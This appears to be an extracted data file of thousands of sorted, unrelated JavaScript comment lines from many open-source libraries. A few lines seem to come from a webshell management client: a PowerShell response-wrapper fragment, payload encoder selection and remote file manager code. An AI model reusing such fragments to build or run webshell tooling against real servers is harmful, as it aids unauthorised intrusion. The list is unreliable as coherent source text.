"// you can override either this method, or the async _read(n) below."
"// you try to trace through ""use strict"" call chains. (#13335)"
"// z and zinv are just BigIntegers, not fieldElements"
"// { ""foo"": 0, ""bar"": { ""baz"": ""abc"", ""additional2"": 2 }"
"// { ""foo"": 1, ""bar"": ""baz"" }"
"// { ""foo"": 1, ""bar"": false }"
"// { ""foo"": [1], ""bar"": false }"
"// { _id: 'id1', planet: 'Mars', system: 'solar', inhabited: false }"
"// { _id: 'id1', planet: 'Mars', system: 'solar', inhabited: false, satellites: ['Phobos', 'Deimos'] }"
"// { _id: 'id2', planet: 'Earth', system: 'solar', inhabited: true }"
"// { _id: 'id2', planet: 'Earth', system: 'solar', inhabited: true, humans: { genders: 2, eyes: true } }"
"// { _id: 'id3', planet: 'Jupiter', system: 'solar', inhabited: false }"
"// { _id: 'id4', planet: 'Omicron Persei 8', system: 'futurama', inhabited: true, humans: { genders: 7 } }"
"// { _id: 'id4', planet: 'Omicron Persia 8', system: 'futurama', inhabited: true }"
"// { _id: 'id5', completeData: { planets: [ { name: 'Earth', number: 3 }, { name: 'Mars', number: 2 }, { name: 'Pluton', number: 9 } ] } }"
"// { a: ""a"", b: ""b"" }"
"// { code: '40 + 2',"
"// { code: 'unodostresquatro',"
"// { encoding: ""Big5"", confidence: 0.99 }"
"// { encoding: ""UTF-8"", confidence: 0.9690625 }"
"// { line: 1,"
"// { line: 2, column: 28 }"
"// { networkAddress: '192.168.1.128',"
"// { source: 'foo.coffee',"
"// { source: 'http://example.com/www/js/two.js',"
"// { source: 'illmatic.js',"
"// { source: 'source.js',"
"// { source: null,"
"// { start: 0, end: 39, startTag: ..., endTag: ... }"
"// { start: 13, end: 32 }"
"// { start: 3, end: 13 }"
"// { text: 'INFORMIX', value: 'informix' }"
"// { text: 'INFORMIX', value: 'informix', selected: conf['type'] === 'informix' }"
"// { text: 'MSSQL', value: 'mssql' },"
"// { text: 'MSSQL', value: 'mssql', selected: conf['type'] === 'mssql' },"
"// { text: 'MYSQLI', value: 'mysqli' },"
"// { text: 'MYSQLI', value: 'mysqli', selected: conf['type'] === 'mysqli' },"
"// { text: 'ORACLE', value: 'oracle' },"
"// { text: 'ORACLE', value: 'oracle', selected: conf['type'] === 'oracle' },"
"// { text: 'ORACLE_OCI8', value: 'oracle_oci8' },"
"// { text: 'ORACLE_OCI8', value: 'oracle_oci8', selected: conf['type'] === 'oracle_oci8' },"
"// { text: 'PostgreSQL', value: 'postgresql' },"
"// { text: 'PostgreSQL', value: 'postgresql', selected: conf['type'] === 'postgresql' },"
"// { text: 'PostgreSQL_PDO', value: 'postgresql_pdo' },"
"// { text: 'PostgreSQL_PDO', value: 'postgresql_pdo', selected: conf['type'] === 'postgresql_pdo' },"
"// { text: 'SQLSRV', value: 'sqlsrv' },"
"// { text: 'SQLSRV', value: 'sqlsrv', selected: conf['type'] === 'sqlsrv' },"
"// { text: 'SQLite_PDO', value: 'sqlite_pdo' },"
"// { totallySafeProperty: ""p455w0rd"" }"
"// { userId: 1, postId: 19 }"
"// {""ct"":""tZ4MsEnfbcDOwqau68aOrQ=="",""iv"":""8a8c8fd8fe33743d3638737ea4a00698"",""s"":""ba06373c8f57179c""}"
"// {0}',$_.ToString()));};[System.String]::Format('{0}{1}{2}',$TAGS,$RESP,$TAGE);`;"
"// {a: 'str', b: 2}"
"// {count: 2, _: ['positional']}"
"// {foo, bar as bas}"
"// {name: 'between', value: ' example',       start: 33, end: 41}"
"// {name: 'between', value: 'Here is ',       start: 0,  end: 8},"
"// {name: 'left',    value: '<div>',          start: 8,  end: 13},"
"// {name: 'literal', value: '...', start: 0, end: 3},"
"// {name: 'literal', value: '\\{', start: 6, end: 8},"
"// {name: 'match',   value: ' <div>an</div>', start: 13, end: 27},"
"// {name: 'right',   value: '</div>',         start: 27, end: 33},"
"// {name: 'value',   value: '1',   start: 4, end: 5},"
"// {name: 'value',   value: 'function(x,y){return y+x;}', start: 9, end: 35}"
"// {type: ""label"", label: LANG['filemanager']['title']},"
"// {x: x, y: y}"
"// |Pattern[~U, +N]| and use this result instead. Throw a *SyntaxError*"
"// |obj| is a plain object, created by {} or constructed with new Object"
"// } from ""..."";"
"// }', 'http://wow');"
"// }, (_) => {"
"// }, (err) => {"
"// }, (ret) => {"
"// },"
"// ~, ~> --> * (any, kinda silly)"
"// ~1.2, ~1.2.x, ~>1.2, ~>1.2.x --> >=1.2.0 <1.3.0-0"
"// ~1.2.0, ~>1.2.0 --> >=1.2.0 <1.3.0-0"
"// ~1.2.3, ~>1.2.3 --> >=1.2.3 <1.3.0-0"
"// ~2, ~2.x, ~2.x.x, ~>2, ~>2.x ~>2.x.x --> >=2.0.0 <3.0.0-0"
"// ~2.0, ~2.0.x, ~>2.0, ~>2.0.x --> >=2.0.0 <2.1.0-0"
"// ~40 pixels, for DOM_DELTA_SCREEN (2) it is 87.5% of viewport size."
'use strict';"
-// Permission is hereby granted, free of charge, to any person obtaining a"
-// THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS"
-// The above copyright notice and this permission notice shall be included"
//		This checks to ensure that the result is valid and will throw an appropriate error message if it is not
//		paths to a single mechanism.
//	1. Enforce API surface and semantic compatibility with 1.9.x branch"
//	2. Improve the module's maintainability by reducing the storage
//	5. Avoid exposing implementation details on user objects (eg. expando properties)
//	6. Provide a clear path for implementation upgrade to WeakMap in 2014
//	BigInteger.prototype.am = am1;
//	BigInteger.prototype.am = am2;
//	BigInteger.prototype.am = am3;
//	Implementation Summary
//	dbits = 26;
//	dbits = 28;
//	dbits = 30;
//	summary:
// 						message: which indicates what the error was
// 						property: which indicates which property had the error
// 					empty list will be returned. A validation error will have two properties:
// 			if ( !w.document ) {
// 			return factory( w );
// 			valid: A boolean indicating if the instance is valid by the schema
// 			}
// 		The checkPropertyChange method will check to see if an value can legally be in property with the given schema
// 		The validate method will return an object with two properties:
// 		This is slightly different than the validate method in that it will fail if the schema is readonly and it will
// 		both validations will occur).
// 		function( w ) {
// 		information.
// 		};
// 	// For CommonJS and CommonJS-like environments where a proper `window`
// 	// For environments that do not have a `window` with a `document`
// 	// See ticket #14549 for more info.
// 	// This accentuates the need for the creation of a real `window`.
// 	factory( global );
// 	module.exports = global.document ?
//  	To use the validator call JSONSchema.validate with an instance object and an optional schema object.
//                                          true in FF and Safari
//                      }
//                   http://www.ogcio.gov.hk/tc/business/tech_promotion/ccli/terms/doc/hkscs-2008-big5-iso.txt
//                 * this is comment
//                 */
//                 BendingBender <https://github.com/BendingBender>
//                 Leon Yu <https://github.com/leonyu>
//                 Maple Miao <https://github.com/mapleeit>
//               (0xA1-0xFE)x2   - 0208 plane (94x94).
//               * This is comment of t
//               */
//               0x00-0x7F       - lower part of 0201
//               : GaikwadPratik <https://github.com/GaikwadPratik>
//               Used as-is in ISO2022 family.
//              rs.length);
//             If not found see `undefined`.
//             code.
//             optional unsigned long byteLength)
//           /./ instanceof RegExp;
//          Use `%2F` as `/` in SOCKET_PATH
//         <= NODE_START -> index of the next node in our trie to process next byte.
//         == GB18030_CODE -> this is the end of a GB18030 4-byte sequence.
//         == UNASSIGNED -> no conversion found. Output a default char.
//         == UNASSIGNED -> unknown/unassigned sequence.
//         Expression: function(node) { ... }
//         See http://dom.spec.whatwg.org/#dom-node-comparedocumentposition for
//         a description of these values.
//         cell_host_list.progressOff();
//         template:'#count#'
//         the files they depend on
//         xy =  1+km
//         xy == 1 (mod m)
//        http://www.apache.org/licenses/LICENSE-2.0"
//        if (cid) {
//        if (pid) {
//        }
//       <https://github.com/libuv/libuv/commit/02e1ebd40b807be5af46343ea873331b2ee4e9c1>
//       <https://github.com/request/request/search?q=ESOCKETTIMEDOUT&unscoped_q=ESOCKETTIMEDOUT>
//       <https://github.com/sindresorhus/got/pull/537>
//       action: this.addConf.bind(this)
//       action: this.delConf.bind(this)
//       action: this.editConf.bind(this)
//       as per safari docs.
//       attr: _[3]
//       continue
//       divider: true
//       files.push(d);
//       folders.push(d);
//       let sql = `CREATE TABLE IF NOT EXISTS \`table_name\` (
//       method2: function () {}
//       move to proper paths.
//       name: The name of the original symbol which generated this chunk of
//       originalColumn: The column number in the original source that
//       originalLine: The line number in the original source that
//       source: The path to the original source file that generated this
//       this.manager.query.editor.session.setValue(sql);
//       }});
//      $(""h2"").scrollagent(function(cid, pid, currentElement, previousElement) {"
//      closest element that is less than that element.
//      of the network interface.
//      return null.
//      the next-closest element.
//      to ipv4).
//      var j = new Number(1);
//      var y = key.slice(bytes+1);
//      });
//     $('#menu a').anchorjump({ parent: '.anchor' });"
//     $('._dropdown-context').css({display:''}).find('.drop-left').removeClass('drop-left');
//     $.anchorjump('#bank-deposit', options);"
//     'json'
//     (process.env.SAUCE_USERNAME && process.env.SAUCE_ACCESS_KEY)) {
//     - import ImportClause FromClause ;
//     - import ModuleSpecifier ;
//     --transforms to--
//     </div>
//     If loading of the style sheet fails its cssRules list is simply
//     Underscore may be freely distributed under the MIT license.
//     Underscore.js 1.4.4
//     Underscore.js 1.8.3
//     _encoders.push(_);
//     are sorted by their value.
//     callback([]);
//     cell_host_list.progressOff();
//     checked: _encoder === 'random'
//     column: 20 } ]
//     empty. I.e. an @import rule always has an associated style sheet.
//     f3: [stats for file3]
//     form.uncheckItem('add-MassData');
//     function() {
//     http://marijnhaverbeke.nl/git/acorn"
//     http://underscorejs.org
//     https://github.com/marijnh/acorn.git
//     https://github.com/ternjs/acorn.git
//     if (_ === 'random') {
//     if (_[0].endsWith('/')) {
//     if the value is empty.
//     lastColumn: Infinity } ]
//     let _ = t.split('\t');
//     let d = {
//     platform: 'Windows XP'
//     require('../bower_components/es6-promise/promise');
//     return baz(bar);
//     return n + 1;
//     return this
//     separator.
//     super ( Arguments )
//     super . IdentifierName
//     super [ Expression ]
//     testTasks.push('saucelabs-mocha');
//     this.files.refreshPath();
//     tooltip:{
//     value:'#count#'
//     walk.simple(myTree, {"
//     {
//     {"
//     }
//     });
//     }else{
//    $(""#menu a"").anchorjump();"
//    - Any
//    - Node.DOCUMENT_NODE
//    - Node.ELEMENT_NODE
//    // Via delegate:"
//    </ul>
//    Great discussion & recap of what's going on https://bugzilla.mozilla.org/show_bug.cgi?id=912470#c31
//    Implementations are not consistent within browsers; sometimes labeled as just big5.
//    Licensed under the Apache License, Version 2.0 (the ""License"");"
//    MS Internet Explorer switches from big5 to big5-hkscs when a patch applied.
//    Official spec: http://www.ogcio.gov.hk/en/business/tech_promotion/ccli/terms/doc/2003cmp_2008.txt
//    Orange
//    Pear
//    See the License for the specific language governing permissions and
//    Seems that Mozilla refused to support it for 10 yrs. https://bugzilla.mozilla.org/show_bug.cgi?id=162431 https://bugzilla.mozilla.org/show_bug.cgi?id=310299
//    Unless required by applicable law or agreed to in writing, software"
//    You may obtain a copy of the License at
//    above in isNonFinal(). This is an indication that the text is laid out
//    another readable later.
//    backwards while line order is natural. For charset recognition purposes
//    backwards. +1 for visual score
//    be corrected using another model prober for x-mac-hebrew. Due to the fact
//    because big5-hkscs is the only encoding to include astral characters in non-algorithmic way.
//    care of it.
//    console.error(ended)
//    continuing the loop on any Invalid Package Target error.
//    defined in the ESM resolver.
//    documentElement of the parent window
//    limitations under the License.
//    many unicode code points moved from PUA to Supplementary plane (U+2XXXX) over the years.
//    matchKey minus the length of patternTrailer.
//    may have a @scope/ prefix and the subpath begins with a slash (`/`).
//    really appears at the end. +1 for logical score.
//    return left in right;
//    return left instanceof right;
//    return memo;
//    return.
//    should not appear at the beginning of a word. This is an indication that
//    some unconverted characters showing as question marks. This problem might
//    sorted by the sorting function PATTERN_KEY_COMPARE which orders in descending order of specificity.
//    specifically identified.
//    that contain special punctuation marks or diacritics is displayed with
//    the Non-Final form of that letter. Exceptions to this rule are mentioned
//    the text is laid out backwards. +1 for visual score.
//    word order is unimportant).
//    worth the effort and performance hit.
//    you may not use this file except in compliance with the License.
//   'data' event.
//   'http://example.com/www/js/two.js' ]
//   (http://webfx.eae.net/dhtml/boxsizing/boxsizing.html)
//   (http://www.whatwg.org/specs/web-apps/current-work/#the-doctype)
//   * 'private': the first private ip address of family.
//   * 'public': the first public ip address of family.
//   * Enclosed every 'Pattern' construct with a scope.
//   * Removed everything related to builder.
//   * Removed tests for E4X (ECMAScript for XML).
//   * Removed the test for bug 632030 and bug 632024.
//   * String: First `family` address of the interface.
//   * undefined: First address with `ipv4` or loopback address `127.0.0.1`.
//   - Else return false
//   - check challenge.stale (not necessarily?)
//   - else replace C with `[>=0.0.0]`
//   - else replace c with `[>=0.0.0]`
//   - handle Authentication-Info (not necessarily?)
//   - handle challenge.domain
//   - increase nc (not necessarily?)
//   // grid.editStop();
//   // self.cache[path] = data;
//   // toolbar.disableItem('save');
//   1. No floating point
//   101011
//   109
//   16
//   2. A key and value
//   2. BindingElements
//   2. Don't have exponents
//   2. The data stored at the key
//   3. AssignmentTargets
//   3. The last character is a decimal digit
//   32
//   4. Not hexadecimal OR octal number literal
//   48
//   64
//   80
//   96
//   </ul>
//   <ZWJ>
//   <ZWNJ>
//   > It is a Syntax Error if AssignmentTargetType of [the production] is not"
//   > It is a Syntax Error if [the production] is neither an ObjectLiteral nor"
//   > an ArrayLiteral and AssignmentTargetType of [the production] is not
//   > simple.
//   As a special case, function parameters also use checkLValInnerPattern(),"
//   CSSCharsetRule
//   CSSFontFaceRule
//   CSSPageRule
//   CSSPrimitiveValue
//   CSSRuleList  (cssom just uses array)
//   CSSUnknownRule
//   CSSValue
//   CSSValueList
//   Continuation"
//   Converting to array solves the problem.
//   Counter
//   Date: 2011-02-01
//   Examples where this is used include:"
//   If the sources are not absolute URLs after prepending of the
//   It is also appropriate for checking if an identifier is valid and not"
//   LoneUnicodePropertyNameOrValue
//   PRIMARY KEY ( \`id\` )
//   Quirks mode will draw the canvas using border-box. Either change your
//   RGBColor
//   Rect
//   Ref: http://www.khronos.org/registry/typedarray/specs/latest/
//   RegExpIdentifierName RegExpIdentifierPart
//   RegExpIdentifierStart
//   SourceMap (like resolving script src in a html document).
//   TWO.inc=function(a){return a+1;};
//   The cookie's host-only-flag is false and the canonicalized
//   The cookie's host-only-flag is true and the canonicalized
//   These can occur inside of `<textarea>'s`
//   UnicodeIDContinue
//   UnicodeIDStart
//   UnicodePropertyName `=` UnicodePropertyValue
//   UnicodePropertyNameCharacters
//   UnicodePropertyValueCharacters
//   Use the following to render the element
//   V    V
//   [empty]
//   _.push({
//   __p += 'hi ' + ((__t = ( data.user )) == null ? '' : __t) + '!';
//   `$`
//   `<` RegExpIdentifierName `>`
//   `?` GroupName
//   `\` RegExpUnicodeEscapeSequence[+U]
//   `_`
//   `options.base`
//   `this._p1 = 42` -> `this$Foo_p1 = 42`
//   as they also support defaults and rest constructs.
//   bmenu([
//   but not by others (comment: 8; processing instruction: 7; etc.)
//   call read here would abort the flow and there's no other mechanism for
//   callback(data);
//   called push() with new data. In this case we skip performing more
//   case where the the stream has called the implementation defined _read()
//   column: 56 }
//   console.error('You have already piped to this stream. Pipeing twice is likely to break the request.')
//   constructs for which the spec says
//   contains: function(addr){...} }
//   continue with the normal flow:
//   continuing the flow if the stream consumer has just subscribed to the
//   dejavu.Class.declare({
//   dejavu.Class.declare({method2: function () {
//   destructuring patterns. This is generally appropriate for constructs for
//   different from the canvas one.
//   doctype to HTML5
//   expressions are also correctly handled. This is generally appropriate for
//   files on a server or removing repeated values in the
//   first  byte range: 0xa0 -- 0xfe
//   first  byte range: 0xa4 -- 0xfe
//   first  byte range: 0xb0 -- 0xfe
//   first  byte range: 0xc4 -- 0xfe
//   foo this is hex: 68656c6c6f20776f726c6421 +0ms
//   for (let _ in this) {
//   grid.editCell();
//   http://www.apache.org/licenses/LICENSE-2.0"
//   http://www.w3.org/TR/REC-xml-names/#defaulting
//   https://bitbucket.org/lindenlab/llsd
//   https://github.com/inexorabletash/polyfill
//   id: id
//   if (ret === '1') {
//   if (ret.startsWith('ERROR://')) {
//   if (state == true && form.isItemChecked('add-MassData')) {
//   implement something. Should onload only fire after all @imports have been
//   initial === would have catch identical references anyway
//   is available. If highWaterMark is 0 and we are not in the flowing mode
//   is not enforced.
//   is responsible for filling the buffer with enough data if such data
//   it could still be an XML element
//   let _encoders = [];
//   let _index = parseInt(Math.random() * _encoders.length);
//   let files = [];
//   let idx = grid.getRowIndex(rid);
//   let tmp = ret.split('\n');
//   location.reload();
//   map: [object SourceMapGenerator] }
//   name: 'n' }
//   name: null }
//   nothing other than identifiers and member expressions. Parenthesized
//   object or array destructuring pattern.
//   or use Box Sizing Behavior from WebFX
//   path: path
//   plugsData.push({
//   printing the element as if it is an object.
//   read()s. The execution ends in this method again after the _read() ends
//   request-host is identical to the cookie's domain.
//   return __p;
//   return callback(cache);
//   return superagent.Request.prototype.proxy = function() {
//   return true;
//   return;
//   second byte range: 0xa1 -- 0xfe
//   some: 'data'
//   state.encoding: streams2
//   stream._decoder: streams1
//   tag_e = this.__opts__['otherConf']['custom-datatag-tage'];
//   tag_s = this.__opts__['otherConf']['custom-datatag-tags'];
//   task.failed('len=' + _size);
//   the loop below is responsible for ensuring read() is called. Failing to
//   the parser got too confused to return anything meaningful.
//   this.cell.close();
//   this.cell.progressOff();
//   this.files.cell.progressOff();
//   this.initUI(ret);
//   title: LANG['confirm']['title']
//   up calling push() with more data.
//   var c =
//   var t = 20;  /*
//   we should _not_ attempt to buffer any extra data. We'll get more data
//   when the stream consumer calls read() instead.
//   where a is the node to be checked.
//   which the spec says
//   width and height style values which isn't correct.
//   xy(2-xy) = (1+km)(1-km)
//   |    Sign
//   |    |
//   }
//   } );
//   });
//   };
//   }else{
//  'Callback': mySelectorCallback
//  *
//  * Allows typed_array.get/set() as alias for subscripts (typed_array[])
//  * Base64 must not be used to represent direct characters.
//  * Big5-2003 (Taiwan standard) almost superset of cp950.
//  * EUC-JP:    Up to 3 bytes per character. Used mostly on *nixes.
//  * ISO2022-JP-1: Adds esc seq for 0212-1990.
//  * ISO2022-JP-2004: Adds 0213-2004 Plane 1.
//  * No implicit shift back from Base64 (should always end with '-')
//  * String must end in non-shifted position.
//  * Unicode-at-on (UAO) / Mozilla 1.8. Falling out of use on the Web. Not supported by other browsers.
//  * Windows CP 950: Microsoft variant of Big5. Canonical: http://www.unicode.org/Public/MAPPINGS/VENDORS/MICSFT/WINDOWS/CP950.TXT
//  * Windows CP 951: Microsoft variant of Big5-HKSCS-2001. Seems to be never public. http://me.abelcheung.org/articles/research/what-is-cp951/
//  */
//  - Node
//  - Object
//  0..25 map to ASCII a..z or A..Z
//  112
//  128
//  144
//  160
//  176
//  192
//  208
//  224
//  240
//  256
//  272
//  288
//  304
//  320
//  336
//  352
//  368
//  384
//  400
//  416
//  432
//  448
//  464
//  480
//  496
//  512
//  528
//  544
//  560
//  576
//  592
//  608
//  624
//  640
//  656
//  672
//  688
//  704
//  720
//  736
//  752
//  768
//  784
//  800
//  816
//  832
//  848
//  864
//  880
//  896
//  912
//  928
//  944
//  960
//  976
//  992
//  Companion to implicitSetter, but for the individual parts."
//  The example from `auto` can be rewritten as follows:
//  _owner contains circular references
//  `function a() {/** comments **\/}`
//  first  byte range: 0xb0 -- 0xfe
//  from <http://www.w3.org/TR/html5/syntax.html#parsing-main-inbody>
//  if (ctx.toString) return ctx.toString();
//  if (memoSuffix.length >= punySuffix.length) {
//  innnerComments for properties empty block
//  return correct results)
//  second byte range: 0xa1 -- 0xfe
//  stream.autoPause   = !(opts && opts.autoPause   === false)
//  the individual parts from the cssText.
//  var memoSuffix = Punycode.toASCII(memo.suffix);
//  }
// !
// != `if (match[0].length)`
// !== and ===
// ""ISO-8859-8-I"" is a subset of windows-1255 and doesn't need to be"
// ""Logical"" directionality means the text is ordered ""naturally"" according to"
// ## Build Metadata
// ## Build Metadata Identifier
// ## Character categories
// ## Full Version String
// ## Main Version
// ## Non-numeric Identifier
// ## Numeric Identifier
// ## Parser utilities
// ## Pre-release Version
// ## Pre-release Version Identifier
// ## Token types
// ## Tokenizer
// ### Expression parsing
// ### Statement parsing
// ### Token reading
// ### function address (name, family)"
// #### @family {ipv4|ipv6} **Optional** IP family of the address (defaults
// #### @name {string|'public'|'private'} **Optional** Name or security
// #/ or html5 state
// #1000 don't catch errors from the callback to avoid double calling it
// #1450: sometimes IE returns 1223 when it should be 204
// #14683: Only rethrow if this hasn't been notified as an error yet
// #72 and bugzil.la/889492.
// #9682: remove data so that it's not used in an eventual retry
// #Foo Id case sensitive
// #table-binary-unicode-properties
// #table-unicode-general-category-values
// #table-unicode-script-values
// $ (dollar) and _ (underscore)
// $$('#table-binary-unicode-properties > figure > table > tbody > tr > td:nth-child(1) code').map(el => el.innerText)
// $& means the whole matched string
// $($)
// $(<html>)
// $([dom])
// $(dom)
// $addToSet adds an element to an array only if it isn't already in it
// $each can be used to $push or $addToSet multiple values at once
// $pop removes an element from the end (if used with 1) or the front (if used with -1) of the array
// $pull removes all values matching a value or even any NeDB query from the array
// $push inserts new elements at the end of the array
// %
// &
// & with processes umask to override invalid perms
// &#39;application/xml&#39; will be automatically serialized</code></pre>
// &2:Thanks [@Medicean][medicaean-github]
// &amp and such.
// &amp;
// &gt;
// &lt;
// '
// ' '
// ' \n'
// ' there'
// '!', '#', '$', '%', '&', ''', '*', '+', '-',"
// '#'
// '%*'
// '(' or '.'
// '*'
// '*' prefix = not the preferred type for this extension.  So fixup the
// '+'
// '+-'
// '-->' is a single-line comment
// '--dqo34k'
// '.'
// '/'
// '0'
// '1.0.0'
// '1.2.3'
// '1.2.4-beta.0'
// '127.0.0.1'
// '2'
// '2.0.0'
// '403'
// '42.6.7'
// '9'
// ': {
// ':not()' pseudo-classes as for specifications
// '<>'
// '=!'
// '=' (char #61) marks an assignment or comparison operator.
// '=' is immediately at start
// '=>'
// '?'
// 'A'
// 'Authorization' header in.
// 'Boolean'
// 'SGVsbG8sIHdvcmxkIQ=='
// 'UTF-8'
// 'Z'
// '\'
// '\f'
// '\r'
// '\r\n'
// '\t'
// '\v'
// '\x2D'
// '\xa0'
// '^'
// '`'
// 'a b'
// 'a'
// 'a.b.c.d'
// 'a.b.c=d&a.b.e=f'
// 'a=b&a=c&a=d'
// 'a=b&a=c'
// 'a=b&c=d&e[f]=123&e[g][0]=4'
// 'a=b&e=f'
// 'a[0]=b&a[1]=c&a[2]=d'
// 'a[0]=b&a[1]=c'
// 'a[0]=b&a[2]=d'
// 'a[]=b&a[]=c'
// 'a[b][c]=d&a[b][e]=f'
// 'application/javascript'
// 'application/json'
// 'application/json; charset=utf-8'
// 'application/xml' will be automatically serialized
// 'ascii'
// 'auffer'
// 'b' -> '\b'
// 'b.c.kobe.jp'
// 'bin'
// 'buffer' (copy is not changed)
// 'chunk' is an input chunk.
// 'city.kobe.jp'
// 'class' is an ECMA4 reserved keyword
// 'com'
// 'const' is specialized as Keyword in V8.
// 'domain.biz'
// 'domain.com. IN KEY ...' or 'domain.com. IN DNSKEY ...'
// 'dotall' regex modifier. See:
// 'drain' on next tick (5)
// 'eE'
// 'error'
// 'example.com'
// 'example.example'
// 'example.uk.com');
// 'f' -> '\f'
// 'foo'
// 'foo.com'
// 'g7'
// 'google'
// 'google.com'
// 'he'
// 'hello there'
// 'hello'
// 'home' AsyncSquaringLibrary context and the value of `this.squareExponent`
// 'image/png'
// 'lechotet' (to chat) containing an apostrophe after the tsadi. This
// 'let' is for compatiblity with SpiderMonkey and ES.next.
// 'levn'
// 'maana-pta'
// 'module'
// 'n' -> '\n'
// 'object'
// 'object' for typeof a RegExp. We'll normalize this here so that /bla/
// 'of type `object`'.
// 'r' -> '\r'
// 're'
// 'react'; import ReactDOM from 'react-dom'; import AceEditor from 'react-ace';
// 'readable' etc.
// 'readable' event will be triggered.
// 'readable' now to make sure it gets picked up.
// 'return' followed by a space and an identifier is very common.
// 'startfoo123bar'
// 'str'
// 't' -> '\t'
// 'text/html'
// 'text/markdown'
// 'text/x-markdown; charset=utf-8'
// 'type' can only be read by using native getAttribute
// 'u'
// 'unodostresquatro'
// 'utf8'
// 'v' -> '\u000b'
// 'www'
// 'x'
// 'xn--85x722f.com.cn'
// 'xn--85x722f.xn--55qx5d.cn'
// 'yield' and 'let' are for compatiblity with SpiderMonkey and ES.next.
// 'yield' is only treated as a keyword in strict mode.
// 'z'
// '{'
// '|&'
// '~'
// ( )
// ( event )  dispatched jQuery.Event
// ( open bracket
// ('' + value) makes it output the correct toString()-value.
// (1)
// (1) Partitioning.
// (2)
// (2) Recurse on each half.
// (3)
// (4)
// (5)
// (6)
// (7) closing tag
// (7) open tag
// (Annex B.1.1 on Numeric Literals)
// (Date object)
// (Mask low bits)
// (Note `mimelite` here)
// (Re)load the contents of the PAC file URI
// (Rendering will throw with a helpful message and as soon as the type is
// (Replaces the onupgradeneeded test.)
// (What uri protocol are you using then?)
// (`localStorage.foo`) returns `undefined` for the same key. Gaia's
// (a la preventing access of properties of unowned objects)
// (and also as state parameter when no other state is present).
// (and therefore has an element appears at this[ 0 ]) and the
// (assumes parentNode is actually the parent)
// (avoids potential for endless recursion during removal of special event handlers)
// (do a pretty print to see this)
// (do not set dirty)
// (e.g. implementation.createHTMLDocument)
// (e.g. to handle extra CRLFs on .NET servers)
// (excepting IE8 booleans)
// (finalsub > 0 - Logical) or (don't know what to do) default to Logical.
// (for the name attribute)
// (http://ejohn.org/blog/javascript-micro-templating/)
// (i.e. it's not abstract) but that it needs no arguments.
// (i.e. matchContextualKeyword) appropriately.
// (i.e. without iterating backwards through the stack).
// (if any) are skipped twice during the lexical analysis.
// (in this case the eval call) is appended to the output buffer
// (including final letters).
// (it can always be set on a per-request basis or even using ajaxSetup)
// (just the API value in jsdom) must also be updated.
// (like a Link depending on its target) or destructive operations (like
// (no matter how long the jqXHR object will be used)
// (node) warning: Recursive process.nextTick detected. This will break in the next version of node. Please use setImmediate for recursive deferral.
// (non-standard) ParenthesizedExpression nodes
// (one.js and two.js) to a minified generated source.
// (only thrown for getters/methods that are affected by removing steps)
// (protected) alternate constructor
// (protected) clamp off excess high words
// (protected) convert from radix string
// (protected) convert to radix string
// (protected) copy this to r
// (protected) r = this + a
// (protected) r = this - a
// (protected) r = this << n
// (protected) r = this << n*DB
// (protected) r = this >> n
// (protected) r = this >> n*DB
// (protected) r = this op a (bitwise)
// (protected) return x s.t. r^x < DV
// (protected) set from string and radix
// (protected) this op (1<<n)
// (protected) true iff this is even
// (provided you passed options.sourceFileName earlier) the
// (public)
// (public) -this
// (public) 1/this % m (HAC 14.61)
// (public) Constructor
// (public) convert to bigendian byte array
// (public) return number of set bits
// (public) return string representation in given radix
// (public) return value as byte
// (public) return value as integer
// (public) return value as short (assumes DB>=16)
// (public) returns index of lowest 1-bit (or -1 if none)
// (public) test primality with certainty >= 1-.5^t
// (public) this % a
// (public) this & a
// (public) this & ~(1<<n)
// (public) this & ~a
// (public) this * a
// (public) this + a
// (public) this - a
// (public) this / a
// (public) this << n
// (public) this >> n
// (public) this ^ (1<<n)
// (public) this ^ a
// (public) this mod a
// (public) this | (1<<n)
// (public) this | a
// (public) this^2
// (public) this^e
// (public) this^e % m (HAC 14.85)
// (public) true iff nth bit is set
// (public) |this|
// (public) ~this
// (quicker than $.extend)
// (quite reliably!) inferred from the original code.
// (re-)implement some things that are known busted or missing.
// (removed a line which had octal literals inside since octal literals are not allowed in template strings)
// (returning the new matched element set)
// (see: https://github.com/request/request/blob/master/lib/cookies.js).
// (signaled by `.parent` returning a reference to the same object)
// (since `REGEX_NEWLINE` captures its match).
// (so also no leading and trailing slashes - it does not distinguish
// (such as loading iframes in IE - #4833)
// (termination case 2).
// (the 'system' and inhabited fields are not here anymore)
// (the latter of which guarantees us context)
// (the user may have provided their own)
// (tracker will be null if the document has no Window)
// (we check in cache first)
// (where an identifier is sometimes a keyword depending on the context)
// (which is just equivalent to: $(context).find(expr)
// ) close bracket
// );
// );`;
// * Canvas width/height should is using content-box by default. IE in
// * Clipping paths are not implemented.
// * Coordsize. The width and height attribute have higher priority than the
// * Non uniform scaling does not correctly scale strokes.
// * Optimize. There is always room for speed improvements.
// * Painting mode isn't implemented.
// * Patterns are not implemented."
// * Radial gradient are not implemented. The VML version of these look very
// * `-` but not as a starting or ending character
// * `.` as a separator for the textual portions of a domain name
// * `0-9`
// * `a-z`"
// * http://en.wikipedia.org/wiki/Domain_name"
// * http://en.wikipedia.org/wiki/Hostname
// *** Adjacent sibling combinator
// *** Attribute selector
// *** Child combinator
// *** Class selector
// *** Descendant combinator
// *** General sibling combinator
// *** ID selector
// *** Structural pseudo-classes
// *** Type selector
// *** UI element states and dynamic pseudo-classes
// *** Universal selector
// **`v1()` - Generate time-based UUID**
// **tag it in the repository**
// *... In the case of properties that might _actually_
// *:
// *below* the call to _read.  The reason is that in certain
// *its* subpropertiesX
// *that* in the unary operator node.
// +
// + between element and substitution
// -
// - 'async /*\n*/ function' is invalid.
// - 'async /*foo*/ function' is OK.
// - Accessing the rules defined in individual stylesheets
// - CSSOM-View
// - Check that none of the bound/assigned-to identifiers are reserved words."
// - DOM nodes
// - Else return true
// - If C is only the ANY comparator
// - If EQ
// - If GT
// - If LT
// - If c is only the ANY comparator
// - Label consistency (no conflicts, break only to existing labels)"
// - Less-used features of link: disabled
// - Let EQ be the set of = comparators in c
// - Let GT be the highest > or >= comparator in c
// - Let LT be the lowest < or <= comparator in c
// - Modifications to link.href property are reflected in sheet property.
// - Modifications to style content attribute are reflected in style property
// - Modifications to style element's sheet property are reflected in textContent.
// - Modifications to style element's textContent are reflected in sheet property.
// - Modifications to style property are reflected in style content attribute
// - Not enough data buffered (state.length < state.highWaterMark). The loop
// - Record name declarations for bindings in the appropriate scope.
// - Return outside functions is allowed"
// - The stream has ended (state.ended).
// - There is already a pending 'read' operation (state.reading). This is a
